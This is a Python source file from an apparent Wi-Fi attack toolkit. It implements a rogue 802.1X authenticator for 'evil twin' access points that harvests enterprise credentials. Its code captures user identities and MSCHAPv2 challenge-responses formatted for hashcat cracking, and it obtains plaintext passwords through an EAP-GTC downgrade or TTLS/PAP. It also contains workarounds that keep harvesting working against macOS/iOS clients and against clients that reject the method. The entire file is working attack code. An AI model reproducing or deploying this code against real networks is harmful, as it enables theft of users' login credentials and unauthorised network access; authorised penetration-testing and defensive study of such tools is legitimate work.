"""The rogue 802.1X authenticator / EAP server state machine.

Transport-agnostic and synchronous: ``start()`` and ``receive(EapMessage)`` return the EAP packets to
send next, and ``captured`` holds the harvested credential once the inner method completes. The
FakeAP wraps these packets in EAPOL-EAP data frames; the loopback tests drive ``receive`` directly.

Supported: an outer PEAP or EAP-TTLS TLS tunnel, inner EAP-MSCHAPv2 (hashcat -m 5500), an optional
EAP-GTC downgrade (plaintext), and EAP-TTLS/PAP (plaintext). Identity is captured even if the
supplicant validates the certificate and aborts the tunnel.
"""
from __future__ import annotations

import logging
import os
import struct
from dataclasses import dataclass
from enum import Enum, auto
from typing import Callable, Optional

from wifit3.crack.netntlm_format import mschapv2_hashlines, plaintext_line
from wifit3.dot11 import mschapv2
from wifit3.dot11.eap import EAP_REQUEST, EAP_RESPONSE
from wifit3.dot11.eap_build import (
    EAP_TYPE_GTC, EAP_TYPE_IDENTITY, EAP_TYPE_MSCHAPV2, EAP_TYPE_NAK, EAP_TYPE_PEAP, EAP_TYPE_TTLS,
    EapMessage, eap_frame, eap_packet, eap_request_identity, eap_success, eap_tls_body,
    parse_eap, parse_eap_tls_body,
)
from wifit3.campaigns.eviltwin_enterprise.tls import TlsTunnel, server_context

logger = logging.getLogger(__name__)

MAX_TLS_FRAGMENT = 1024
_MAX_PHASE2_RETRIES = 4           # re-request the inner identity this many times before giving up
# EAP-TTLS phase-2 Diameter AVP codes (RFC 5281 / RADIUS attribute numbers).
_AVP_USER_NAME, _AVP_USER_PASSWORD, _AVP_EAP_MESSAGE = 1, 2, 79


class Method(str, Enum):
    PEAP = "PEAP"
    TTLS = "EAP-TTLS"


class _State(Enum):
    IDENTITY = auto()
    TLS = auto()
    PHASE2 = auto()
    DONE = auto()


@dataclass
class Capture:
    """A harvested credential. ``hashline`` is a hashcat -m 5500 line (MSCHAPv2); ``password`` is
    plaintext (GTC / PAP); either may be None for an identity-only capture. ``hashlines`` holds every
    crackable variant (a domain-qualified name adds a stripped-name line); ``hashline`` is the first."""
    ssid: str
    username: str
    inner_method: str
    hashline: Optional[str] = None
    password: Optional[str] = None
    hashlines: tuple[str, ...] = ()

    @property
    def all_hashlines(self) -> tuple[str, ...]:
        """Every hashcat line for this capture, falling back to the single ``hashline``."""
        if self.hashlines:
            return self.hashlines
        return (self.hashline,) if self.hashline else ()


class EapServer:
    def __init__(self, ssid: str, *, method: Method = Method.PEAP, gtc_downgrade: bool = False,
                 context=None, server_name: str = "wifit3",
                 on_event: Optional[Callable[[str], None]] = None) -> None:
        self.ssid = ssid
        self.method = method
        self.gtc_downgrade = gtc_downgrade
        self.server_name = server_name
        self.on_event = on_event or (lambda _m: None)
        self._announced_tls = False
        self._outer_type = EAP_TYPE_PEAP if method is Method.PEAP else EAP_TYPE_TTLS
        self._context = context or server_context()
        self._tunnel: Optional[TlsTunnel] = None
        self._state = _State.IDENTITY
        self._id = 1
        self._pending_frags: list[bytes] = []
        self._in_buf = bytearray()
        self._await_phase2 = False
        self._inner_id = 1
        self.outer_identity: str = ""
        self.inner_username: str = ""
        self._auth_challenge = b""
        self._offered_gtc = gtc_downgrade
        self._phase2_retries = 0
        self._inner_headerless: Optional[bool] = None    # PEAPv0 (macOS/iOS) sends inner EAP as <type><data>
        self._inner_mode = "peap"                         # or "ttls_eap": inner EAP wrapped in an AVP
        # Advertise our max PEAP version in the Start; the client picks down and we adopt its choice.
        self._outer_version = 1 if method is Method.PEAP else 0
        self.captured: Optional[Capture] = None

    @property
    def done(self) -> bool:
        return self._state is _State.DONE

    # ----- turns -------------------------------------------------------------

    def start(self) -> list[bytes]:
        """The first packet: EAP-Request/Identity."""
        self._id = 1
        return [eap_request_identity(self._id)]

    def receive(self, eap: EapMessage) -> list[bytes]:
        if eap.code != EAP_RESPONSE or self._state is _State.DONE:
            return []
        if self._state is _State.IDENTITY:
            return self._on_outer_identity(eap)
        return self._on_tls_response(eap)

    # ----- outer identity + tunnel start -------------------------------------

    def _on_outer_identity(self, eap: EapMessage) -> list[bytes]:
        self.outer_identity = eap.data.decode("utf-8", errors="replace").strip("\x00")
        self.on_event(f"identity = {self.outer_identity or '<empty>'}; starting {self.method.value} TLS")
        self._capture_identity_only()
        self._tunnel = TlsTunnel(self._context, server_side=True)
        self._state = _State.TLS
        return [self._request(self._tls_body(start=True))]

    def _capture_identity_only(self) -> None:
        """Record the (outer) identity immediately, so a cert-validating supplicant that aborts the
        tunnel still leaves a username behind."""
        if self.outer_identity:
            self.captured = Capture(ssid=self.ssid, username=self.outer_identity,
                                    inner_method="Identity")

    # ----- EAP-TLS fragmentation + handshake ---------------------------------

    def _tls_body(self, tls_data: bytes = b"", **flags) -> bytes:
        return eap_tls_body(self._outer_type, tls_data, version=self._outer_version, **flags)

    def _on_tls_response(self, eap: EapMessage) -> list[bytes]:
        body = parse_eap_tls_body(eap.data)
        if body is None:
            return []
        if self.method is Method.PEAP:
            self._outer_version = body.flags & 0x07     # adopt the client's negotiated PEAP version
        if self._pending_frags:                     # peer is ACKing our outbound fragments
            return [self._next_fragment()]
        self._in_buf += body.tls_data
        if body.more:                               # more peer fragments coming: ACK and wait
            return [self._request(self._tls_body())]
        tls_in, self._in_buf = bytes(self._in_buf), bytearray()
        assert self._tunnel is not None
        self._tunnel.feed(tls_in)
        if self._state is _State.TLS:
            return self._advance_handshake()
        return self._advance_phase2(tls_in)

    def _advance_handshake(self) -> list[bytes]:
        assert self._tunnel is not None
        out = self._tunnel.pump_handshake()
        if out:
            if self._tunnel.handshake_done:
                self._await_phase2 = True           # our last flight; phase 2 begins on the next turn
                self._state = _State.PHASE2
                self._announce_tls()
            return self._emit_tls(out)
        if self._tunnel.handshake_done:
            self._state = _State.PHASE2
            self._await_phase2 = False
            self._announce_tls()
            return self._begin_phase2()
        return [self._request(self._tls_body())]

    def _announce_tls(self) -> None:
        if not self._announced_tls:
            self._announced_tls = True
            self.on_event("TLS tunnel established (client accepted the certificate)")

    def _advance_phase2(self, _tls_in: bytes) -> list[bytes]:
        assert self._tunnel is not None
        if self._await_phase2:
            self._await_phase2 = False
            self._state = _State.PHASE2
            plaintext = self._tunnel.read_app()
            if not plaintext:
                return self._begin_phase2()
            return self._handle_phase2(plaintext)
        plaintext = self._tunnel.read_app()
        return self._handle_phase2(plaintext) if plaintext else [
            self._request(self._tls_body())]

    # ----- phase 2 (inside the tunnel) ---------------------------------------

    def _begin_phase2(self) -> list[bytes]:
        """PEAP prompts for an inner identity; TTLS waits for the client's AVPs."""
        if self.method is Method.PEAP:
            return self._inner_send(EAP_TYPE_IDENTITY)
        return [self._request(self._tls_body())]

    def _parse_inner(self, plaintext: bytes) -> Optional[EapMessage]:
        """Decode a tunneled EAP packet, PEAPv1 (full EAP header) or PEAPv0 (macOS/iOS: the Code/Id/
        Length header is dropped, so it is just ``<Type><Data>``). The format is latched on the first
        inner packet and reused for what we send back."""
        if not plaintext:
            return None
        headered = parse_eap(plaintext)
        if headered is not None and headered.code == EAP_RESPONSE and headered.method_type is not None:
            if self._inner_headerless is None:
                self._inner_headerless = False
            return headered
        if self._inner_headerless is None:
            self._inner_headerless = True
        return EapMessage(code=EAP_RESPONSE, identifier=0, method_type=plaintext[0],
                          data=plaintext[1:])

    def _inner_send(self, method_type: int, data: bytes = b"") -> list[bytes]:
        """Send a tunneled EAP request in whichever inner format the client is using: PEAPv1 full EAP,
        PEAPv0 headerless EAP, or EAP wrapped in a TTLS EAP-Message AVP."""
        full = eap_packet(EAP_REQUEST, self._bump_inner(), method_type, data)
        if self._inner_mode == "ttls_eap":
            payload = _avp(_AVP_EAP_MESSAGE, full)
        elif self._inner_headerless:
            payload = full[4:]                        # drop Code/Id/Length for PEAPv0
        else:
            payload = full
        assert self._tunnel is not None
        return self._emit_tls(self._tunnel.write_app(payload))

    def _handle_phase2(self, plaintext: bytes) -> list[bytes]:
        if self.method is Method.TTLS:
            return self._handle_ttls(plaintext)
        return self._dispatch_inner(self._parse_inner(plaintext), plaintext)

    def _handle_ttls(self, plaintext: bytes) -> list[bytes]:
        """EAP-TTLS phase 2 is Diameter AVPs: an EAP-Message AVP (inner EAP, what macOS/iOS send) or
        User-Name + User-Password AVPs (PAP plaintext)."""
        avps = _parse_avps(plaintext)
        if _AVP_EAP_MESSAGE in avps:
            self._inner_mode = "ttls_eap"
            return self._dispatch_inner(parse_eap(avps[_AVP_EAP_MESSAGE]), plaintext)
        if _AVP_USER_NAME in avps and _AVP_USER_PASSWORD in avps:
            username = avps[_AVP_USER_NAME].decode("utf-8", errors="replace").strip("\x00")
            password = avps[_AVP_USER_PASSWORD].decode("utf-8", errors="replace").strip("\x00")
            self.inner_username = username
            self.captured = Capture(ssid=self.ssid, username=username, inner_method="PAP",
                                    password=password)
            logger.info("eviltwin-enterprise captured PAP plaintext for %r on %r", username, self.ssid)
            return self._finish()
        return self._retry_or_finish("TTLS inner is neither EAP-Message nor PAP AVPs", plaintext)

    def _dispatch_inner(self, inner: Optional[EapMessage], plaintext: bytes) -> list[bytes]:
        if inner is None:
            return self._retry_or_finish("empty inner phase-2 packet", plaintext)
        self._phase2_retries = 0                      # a real inner packet: we're on track
        if inner.method_type == EAP_TYPE_IDENTITY:
            self.inner_username = inner.data.decode("utf-8", errors="replace").strip("\x00")
            self.on_event(f"inner identity = {self.inner_username or '<empty>'}")
            return self._send_inner_challenge()
        if inner.method_type == EAP_TYPE_NAK:
            return self._on_inner_nak(inner)
        if inner.method_type == EAP_TYPE_MSCHAPV2:
            return self._capture_mschapv2(inner.data)
        if inner.method_type == EAP_TYPE_GTC:
            return self._capture_gtc(inner.data)
        return self._retry_or_finish(f"unhandled inner EAP type {inner.method_type}", plaintext)

    def _retry_or_finish(self, reason: str, plaintext: bytes) -> list[bytes]:
        """A phase-2 message we can't use. Rather than give up (the old behaviour, which aborted the
        whole login), re-send the inner identity request a few times: a client that was waiting for
        us then answers. The hex is logged so a genuinely unexpected inner format can be fixed."""
        self._phase2_retries += 1
        preview = plaintext[:24].hex() if plaintext else "empty"
        if self._phase2_retries > _MAX_PHASE2_RETRIES:
            self.on_event(f"phase 2: {reason} ({preview}); giving up after {_MAX_PHASE2_RETRIES} tries")
            return self._finish()
        self.on_event(f"phase 2: {reason} ({preview}); re-requesting inner identity")
        return self._begin_phase2()

    def _send_inner_challenge(self) -> list[bytes]:
        self.on_event(f"offering inner {'EAP-GTC (downgrade)' if self._offered_gtc else 'MSCHAPv2'}")
        if self._offered_gtc:
            return self._inner_send(EAP_TYPE_GTC, b"Password")
        self._auth_challenge = os.urandom(16)
        data = mschapv2.challenge_request_data(1, self._auth_challenge,
                                               self.server_name.encode("utf-8"))
        return self._inner_send(EAP_TYPE_MSCHAPV2, data)

    def _on_inner_nak(self, inner: EapMessage) -> list[bytes]:
        """The supplicant rejected our method and listed the ones it wants; switch to GTC or
        MSCHAPv2 if offered, else give up."""
        wanted = set(inner.data)
        self.on_event(f"client NAK'd our method; it wants EAP type(s) {sorted(wanted)}")
        if EAP_TYPE_GTC in wanted:
            self._offered_gtc = True
        elif EAP_TYPE_MSCHAPV2 in wanted:
            self._offered_gtc = False
        else:
            return self._finish()
        return self._send_inner_challenge()

    def _capture_mschapv2(self, data: bytes) -> list[bytes]:
        response = mschapv2.parse_response(data)
        if response is None:
            return self._finish()
        # The ChallengeHash binds the UserName the client itself hashed, which is the name in the
        # response packet, not necessarily the (anonymous or differently cased) inner EAP-Identity.
        # Sourcing it from the inner identity yields an uncrackable hash whenever the two differ.
        username = response.name or self.inner_username or self.outer_identity
        lines = mschapv2_hashlines(username, self._auth_challenge, response.peer_challenge,
                                   response.nt_response)
        self.captured = Capture(ssid=self.ssid, username=username, inner_method="MSCHAPv2",
                                hashline=lines[0], hashlines=tuple(lines))
        logger.info("eviltwin-enterprise captured MSCHAPv2 for %r on %r", username, self.ssid)
        return self._finish()

    def _capture_gtc(self, data: bytes) -> list[bytes]:
        password = data.decode("utf-8", errors="replace").strip("\x00")
        username = self.inner_username or self.outer_identity
        self.captured = Capture(ssid=self.ssid, username=username, inner_method="GTC",
                                password=password, hashline=None)
        logger.info("eviltwin-enterprise captured GTC plaintext for %r on %r", username, self.ssid)
        return self._finish()

    def _finish(self) -> list[bytes]:
        self._state = _State.DONE
        return [eap_success(self._id)]

    @property
    def plaintext_credential(self) -> Optional[str]:
        """The GTC / PAP capture as a ``username:password`` line, else None."""
        cap = self.captured
        if cap is None or cap.password is None:
            return None
        return plaintext_line(cap.username, cap.password)

    # ----- framing helpers ---------------------------------------------------

    def _request(self, body: bytes) -> bytes:
        self._id = (self._id % 255) + 1
        return eap_frame(EAP_REQUEST, self._id, body)

    def _bump_inner(self) -> int:
        self._inner_id = (self._inner_id % 255) + 1
        return self._inner_id

    def _emit_tls(self, out_tls: bytes) -> list[bytes]:
        """Fragment outbound TLS into EAP-TLS packets; queue all but the first for the peer's ACKs."""
        if not out_tls:
            return []
        frags = [out_tls[i:i + MAX_TLS_FRAGMENT] for i in range(0, len(out_tls), MAX_TLS_FRAGMENT)]
        self._pending_frags = frags[1:]
        more = len(frags) > 1
        body = self._tls_body(frags[0], total_length=len(out_tls), more=more)
        return [self._request(body)]

    def _next_fragment(self) -> bytes:
        frag = self._pending_frags.pop(0)
        more = bool(self._pending_frags)
        return self._request(self._tls_body(frag, more=more))


def _parse_avps(plaintext: bytes) -> dict[int, bytes]:
    """Parse an EAP-TTLS phase-2 Diameter AVP block into ``{code: value}`` (last wins)."""
    avps: dict[int, bytes] = {}
    offset = 0
    while offset + 8 <= len(plaintext):
        code, flags = struct.unpack_from(">IB", plaintext, offset)
        length = int.from_bytes(plaintext[offset + 5:offset + 8], "big")
        if length < 8 or offset + length > len(plaintext):
            break
        header = 12 if flags & 0x80 else 8          # V flag adds a 4-byte vendor id
        avps[code] = plaintext[offset + header:offset + length]
        offset += (length + 3) & ~3                 # AVPs are padded to a 4-byte boundary
    return avps


def _avp(code: int, data: bytes, flags: int = 0x40) -> bytes:
    """A Diameter AVP (mandatory bit set), padded to a 4-byte boundary. Used to wrap inner EAP in a
    TTLS EAP-Message AVP."""
    avp = struct.pack(">I", code) + bytes([flags]) + (8 + len(data)).to_bytes(3, "big") + data
    return avp + b"\x00" * ((-len(avp)) % 4)
